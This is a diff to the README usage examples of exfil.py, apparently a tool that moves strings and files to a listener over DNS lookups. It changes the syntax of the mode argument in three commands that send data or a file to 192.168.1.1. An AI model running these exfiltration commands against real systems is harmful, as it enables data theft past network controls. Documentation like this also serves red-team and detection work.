@@ -46,6 +46,6 @@ optional arguments:
 
 Examples
 --------
-* Start a DNS listener on port 5353: `sudo ./exfil.py -l -p 5353 -m dns_lookup`
-* Send a string of data to the server at 192.168.1.1 listening on port 5353: `sudo ./exfil.py -s 192.168.1.1 -p 5353 -d "String of data" -m dns_lookup`
-* Send the file exfil.py to the server at 192.168.1.1 listening on port 5353: `sudo ./exfil.py -s 192.168.1.1 -p 5353 -f exfil.py -m dns_lookup`
+* Start a DNS listener on port 5353: `sudo ./exfil.py -l -p 5353 dns_lookup`
+* Send a string of data to the server at 192.168.1.1 listening on port 5353: `sudo ./exfil.py -s 192.168.1.1 -p 5353 -d "String of data" dns_lookup`
+* Send the file exfil.py to the server at 192.168.1.1 listening on port 5353: `sudo ./exfil.py -s 192.168.1.1 -p 5353 -f exfil.py dns_lookup`
